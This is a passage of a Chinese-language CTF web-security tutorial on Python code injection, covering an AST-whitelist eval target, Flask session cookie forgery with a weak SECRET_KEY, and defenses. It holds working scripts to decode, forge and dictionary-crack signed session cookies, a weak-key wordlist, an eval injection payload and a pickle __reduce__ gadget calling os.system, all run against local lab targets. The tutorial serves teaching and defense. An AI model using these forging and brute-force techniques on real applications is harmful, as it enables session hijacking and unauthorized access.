curl -sG --noproxy '*' --data-urlencode "expr=__import__('os')" 'http://127.0.0.1:9502/l3'
curl -sG --noproxy '*' --data-urlencode "expr=1+2*3-4/2+2**3" 'http://127.0.0.1:9502/l3'
```

输出：

```
[blocked] 节点不在白名单: Attribute
[blocked] 节点不在白名单: Call
[ok] 13.0
```

`().__class__` 死在 Attribute 节点，`__import__('os')` 死在 Call 节点——还没轮到任何词表，语法树里就找不到落脚点；正常算式照常求值。==白名单枚举"允许什么"，比黑名单枚举"禁止什么"可靠==，这条线在第 6 节并进防御。

## 5. Flask session 伪造

[[W01-Web安全导论与HTTP深化#3.4 session id 的传递方式与框架变体|W01 3.4]] 预告过：Flask 的 session 不落盘，全部数据 base64 编码后连时间戳和签名一起塞进 cookie，服务端零存储；==签名只防篡改、不保密==，签名密钥 SECRET_KEY 是唯一的防线。本节把伪造全程走一遍。

### 5.1 cookie 的三段结构

靶（9503 端口）：SECRET_KEY 是一个弱值，`/flag` 只认 session 里的 `admin`。

```python
# session_app.py —— Flask session 靶（9503 端口）
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = "flask-dev-secret-2013"      # 弱密钥：字典里有

@app.get("/login")
def login():
    session["user"] = request.args.get("u", "guest")
    return "logged in, user=%s\n" % session["user"]

@app.get("/who")
def who():
    return "session = %s\n" % dict(session)

@app.get("/flag")
def flag():
    if session.get("admin"):
        return open("flag.txt").read()
    return "admin only\n"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=9503)
```

正常登录一遍，抓下服务端签发的 cookie：

```bash
curl -si --noproxy '*' 'http://127.0.0.1:9503/login?u=guest' -c jar.txt | tr -d '\r' | grep -iE '^(HTTP|set-cookie)'
curl -s --noproxy '*' -b 'session=eyJ1c2VyIjoiZ3Vlc3QifQ.att87w.ToikrwfToufPPrXyHAakIJK7lLU' 'http://127.0.0.1:9503/who'
curl -s --noproxy '*' -b 'session=eyJ1c2VyIjoiZ3Vlc3QifQ.att87w.ToikrwfToufPPrXyHAakIJK7lLU' 'http://127.0.0.1:9503/flag'
```

输出：

```
HTTP/1.1 200 OK
Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QifQ.att87w.ToikrwfToufPPrXyHAakIJK7lLU; HttpOnly; Path=/
session = {'user': 'guest'}
admin only
```

cookie 值是三段、以 `.` 分隔。拆开（读内容不需要密钥，验签才需要）：

```python
# decode_cookie.py —— 拆开三段结构
import base64
import sys
import zlib
from datetime import datetime, timezone, timedelta

cookie = sys.argv[1]
value, ts, sig = cookie.rsplit(".", 2)
comp = value.startswith(".")                 # 带压缩时 payload 以 . 开头
b64 = value[1:] if comp else value
raw = base64.urlsafe_b64decode(b64 + "=" * (-len(b64) % 4))
if comp:
    raw = zlib.decompress(raw)
print("payload :", raw.decode())
stamp = int.from_bytes(base64.urlsafe_b64decode(ts + "=" * (-len(ts) % 4)), "big")
tz = timezone(timedelta(hours=8))
print("时间戳段:", ts, "->", datetime.fromtimestamp(stamp, tz).strftime("%Y-%m-%d %H:%M:%S"), "(UTC+8)")
print("签名段  :", sig)
```

```bash
python3 decode_cookie.py 'eyJ1c2VyIjoiZ3Vlc3QifQ.att87w.ToikrwfToufPPrXyHAakIJK7lLU'
```

输出：

```
payload : {"user":"guest"}
时间戳段: att87w -> 2026-10-23 23:27:43 (UTC+8)
签名段  : ToikrwfToufPPrXyHAakIJK7lLU
```

三段各自的职责：

- **payload**：base64url 编码的 JSON，==内容明文可读==——签名不加密，抓到 cookie 就能读 session；
- **时间戳段**：签名时刻，参与签名计算；
- **签名段**：SECRET_KEY 对前两段的 HMAC。改 payload 或时间戳任何一字节，签名对不上，服务端把整条 cookie 当没登录处理。

### 5.2 已知密钥：手工签发

itsdangerous 是 Flask 的自带依赖，Flask 的 session 签名就是它的 `URLSafeTimedSerializer`。用 `SecureCookieSessionInterface` 拿到与 Flask 同一套签发逻辑，payload 换成想要的 JSON：

```python
# forge_cookie.py —— 用已知 SECRET_KEY 签发伪造 session
import sys
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = sys.argv[1]                  # 服务端的那个值
s = SecureCookieSessionInterface().get_signing_serializer(app)
print(s.dumps({"admin": True}))
```

```bash
python3 forge_cookie.py 'flask-dev-secret-2013'
```

输出：

```
eyJhZG1pbiI6dHJ1ZX0.att87w.4uo_hwIemLooLorRYwS_5Yuw7jo
```

拿去打 `/flag`：

```bash
curl -s --noproxy '*' \
  -b 'session=eyJhZG1pbiI6dHJ1ZX0.att87w.4uo_hwIemLooLorRYwS_5Yuw7jo' \
  'http://127.0.0.1:9503/flag'
```

输出：

```
flag{bytec0de_by_h4nd}
```

伪造就三件事：payload 换成想要的 JSON、用 SECRET_KEY 重算签名、时间戳取当前时间——接口一次做完。==伪造成功的唯一前提是知道 SECRET_KEY==。

### 5.3 SECRET_KEY 从哪泄漏

三类常见来源，靶场里最常考前两类：

| 来源 | 场景 |
| ---- | ---- |
| 源码与配置泄漏 | `app.py` 里写死并随题给附件；`.git` 目录没删（[[W03-信息泄露与前端安全\|W03]]） |
| 弱值与默认值 | 教程里的 `dev`、`secret`、脚手架默认串被带进线上——5.4 的字典就是打这类 |
| 报错页 | Werkzeug 调试页会展开环境变量，SECRET_KEY 常驻 env |

### 5.4 弱密钥爆破

签名可以离线校验：拿一条合法 cookie 当 oracle，逐个候选密钥试签，对得上就是密钥。

```python
# brute_secret.py —— 弱 SECRET_KEY 字典爆破
import sys
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

cookie, wordlist = sys.argv[1], sys.argv[2]
app = Flask(__name__)
for line in open(wordlist):
    key = line.strip()
    if not key:
        continue
    app.secret_key = key
    s = SecureCookieSessionInterface().get_signing_serializer(app)
    try:
        data = s.loads(cookie)               # 签名对得上才不抛异常
    except Exception:
        continue
    print("命中密钥:", key)
    print("session 数据:", data)
    print("伪造 cookie:", s.dumps({"admin": True}))
    break
```

字典用弱值清单（示例的一角）：

```
secret
dev
changeme
123456
password
admin
test
hello
secret_key
supersecret
s3cr3t
your-secret-key
keyboard cat
flask-secret
flask-dev-secret-2013
```

```bash
python3 brute_secret.py 'eyJ1c2VyIjoiZ3Vlc3QifQ.att87w.ToikrwfToufPPrXyHAakIJK7lLU' secret_dict.txt
curl -s --noproxy '*' \
  -b 'session=eyJhZG1pbiI6dHJ1ZX0.att87w.4uo_hwIemLooLorRYwS_5Yuw7jo' \
  'http://127.0.0.1:9503/flag'
```

输出：

```
命中密钥: flask-dev-secret-2013
session 数据: {'user': 'guest'}
伪造 cookie: eyJhZG1pbiI6dHJ1ZX0.att87w.4uo_hwIemLooLorRYwS_5Yuw7jo
flag{bytec0de_by_h4nd}
```

15 个候选毫秒级跑完，每个密钥只做一次 HMAC。==签名校验是离线可比对的，字典质量决定能不能命中==；社区把这套爆破做成了现成工具（flask-unsign 等），核心循环就是上面的十几行。

### 5.5 时间戳与过期

时间戳参与签名，也参与时效：Flask 读取 cookie 时按 `PERMANENT_SESSION_LIFETIME`（默认 31 天）校验签名时刻，超龄 cookie 整体作废；permanent 会话配合 `SESSION_REFRESH_EACH_REQUEST` 在每次响应时续签。对攻击者，伪造时时间戳取当前时间即可，过期不是障碍。

## 6. 防御

**pickle：不把不可信字节流交给反序列化器。** 用户数据一律 JSON；确实要 pickle，就让 Unpickler 只认识白名单里的全局对象。`find_class` 是解析 GLOBAL / STACK_GLOBAL 时的必经钩子，在这里抛异常，opcode 再合法也执行不到：

```python
# safe_unpickler.py —— find_class 白名单钩子
import io
import os
import pickle

class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        raise pickle.UnpicklingError("禁止解析全局对象: %s.%s" % (module, name))

class Exp:
    def __reduce__(self):
        return os.system, ("touch /tmp/should_not_exist",)

blob = pickle.dumps(Exp())
pickle.loads(blob)                            # 对照组：标准 loads
print("标准 loads 后文件存在:", os.path.exists("/tmp/should_not_exist"))
os.remove("/tmp/should_not_exist")
try:
    SafeUnpickler(io.BytesIO(blob)).load()
except pickle.UnpicklingError as e:
    print("SafeUnpickler 拦截:", e)
print("SafeUnpickler 后文件存在:", os.path.exists("/tmp/should_not_exist"))
```

输出：

```
标准 loads 后文件存在: True
SafeUnpickler 拦截: 禁止解析全局对象: posix.system
SafeUnpickler 后文件存在: False
```

**YAML：safe_load。** 外部输入只过 SafeLoader；确需 FullLoader 的场景把数据当半可信处理，并跟上 PyYAML 的版本更新；用户上传的配置里出现 `!!python/` 开头的标签，直接按异常处理。

**eval：AST 白名单，不是黑名单。** 能不 eval 就不 eval；表达式计算交给 `ast.literal_eval()`（只认字面量，4.6 的所有 payload 直接抛 ValueError）；必须支持算式时按 `/l3` 的写法遍历语法树对节点类型做白名单——==黑名单在"攻击者把字符拆开"面前永远枚举不全==。

**SECRET_KEY：强随机、不入库、泄漏即轮换。** 用 `secrets.token_hex(32)` 生成，经环境变量注入进程，不写进源码、不进 git；轮换后所有旧 cookie 的签名失效，等于强制全员重新登录。

**组合防线。** SSTI（[[W09-SSTI|W09]]）与本章的 pickle、YAML、eval 是同一根因的四个入口：==把数据当代码执行==。模板沙箱、受限 Unpickler、FullLoader、eval 词表都是减损措施，防线只在入口处成立——输入不进模板源码、字节流不进反序列化器、表达式不过解释器。

## 7. 常见问题

| 现象 | 原因与解决 |
| ---- | ---------- |
| `pickle.loads` 报 `ValueError: unsupported pickle protocol` | 字节流协议高于解释器上限；dumps 时显式指定低协议，或升级靶机解释器（[[#1.1 协议版本\|1.1]]） |
| loads 旧数据报 `UnicodeDecodeError` | Python 2 时代序列化的 str 在 Python 3 恢复时编码歧义；`loads(data, encoding='latin1')` 兜底 |
| 照抄旧文章的 `yaml.load(payload)` 报 TypeError | PyYAML ≥ 6.0 强制显式 Loader；补 Loader 参数并按 3.1 的版本表选档 |
| 以为 FullLoader 挡住了一切 | apply 与带参 new 被挡，`python/name` 还能把函数对象取进数据（[[#3.2 各 Loader 的行为矩阵\|3.2]]）；不可信输入只过 SafeLoader |
| `__subclasses__()[167]` 在别的靶上取到的不是 `_wrap_close` | 子类下标随版本与 import 序列漂移；按 `__name__` 过滤（[[#4.1 清空 `__builtins__` 不等于封死\|4.1]]） |
| 黑名单加上 `os` 之后，自己的绕过链反而被拦 | 子串匹配误伤：`close` 里就含 `os`；黑名单按词边界匹配，或换 AST 白名单（4.6） |
| 伪造的 cookie 服务端不认 | 签名不匹配（itsdangerous 报 `Signature ... does not match`）：密钥错、payload 改了没重签、cookie 复制时少了尾段，逐项排查 |
| 密钥爆破跑完没命中 | 字典里没有目标密钥，或抓的 cookie 不完整（签名段一个字符都不能少）；换更大字典并核对 Set-Cookie 原文 |
| `eval(expr)` 报 SyntaxError | eval 只收表达式；赋值、import 这类语句要进 exec，或改写成表达式 |
| `exec(bytes.fromhex(...))` 执行了但页面没输出 | exec 没有返回值；要回显用 eval 执行表达式，或在 hex 源码里套 print（[[#4.3 编码绕过与 getattr 链\|4.3]]） |
| `breakpoint()` 打了没反应 | 靶进程 stdin 不可达（HTTP worker 常见）或 PYTHONBREAKPOINT=0 已禁用；本地命令行靶才稳定成立（4.4） |
| format 串拿到了对象引用却执行不了 | format 只有取值没有调用；引用要交给可执行点（二次 eval），或只当信息泄露用（4.5） |
| Flask session 里存的是 pickle 吗 | 不是——Flask 自带 session 是 JSON 加签名；pickle 落点在 flask-session 等服务端扩展与缓存、任务队列（[[#2.3 其他落点\|2.3]]） |

## 8. 配套练习与延伸阅读

> [!note] 实战任务
> 在线靶场：[[01-练习平台索引|05 库的练习平台索引]]列出的 BUUCTF Web 区与 CTFshow 都有 Python/Flask 分类，按本章四个入口各挑一题打一遍——先用本章的指纹方法（base64 开头、`\x80` 魔数、三段式 cookie）确认入口类型，再套对应流程。平台的更多用法见 [[W02-工具链实战与靶场搭建|W02]]。

配套练习：

1. 把 2.1 的 Echo payload 改成手写协议 0 字节码：`cbuiltins\neval\n(...)` 起头，实现同样的回显 RCE，`pickletools.dis` 对照检查栈行为（1.4）。
2. 给 4.6 的靶加一级 `/l2b`：黑名单在 L2 基础上追加 `class`、`base`、`subclasses` 三个词，找一条仍能打穿的 payload；找不到时写下卡住的节点类型，并说明它对应哪个语法成分。
3. 把 5.4 的字典换成更大的弱口令表（如 rockyou 的前 2000 行），给 `brute_secret.py` 计时，算出每秒可试密钥数，估算全表跑完的耗时量级。
4. 防御改造：给 2 节的靶换上 6 节的 SafeUnpickler，白名单只放行 `__main__.Pref`，重放两枚恶意 cookie，把拦截输出与 2.2 的打穿记录对照。

延伸阅读：

- `pickle` 与 `pickletools` 标准库文档：`__reduce__` 的返回值契约、协议差异表、每个 opcode 的完整语义；
- PEP 3154（协议 4）与 PEP 574（协议 5）：FRAME、memo 与带外缓冲的设计动机；
- PyYAML 文档的 Loading YAML 一节：`safe_load` / `full_load` / `unsafe_load` 的语义与 Loader 历史；
- itsdangerous 文档：`URLSafeTimedSerializer`、签名算法与 `max_age` 的时效语义；
- Flask 文档 Handling Sessions：SECRET_KEY 的要求与 permanent 会话的过期、刷新机制；
- [[06-Python与CTF脚本基础|01 库第 6 章]]：本章脚本用到的 Python 基础与脚本套路。
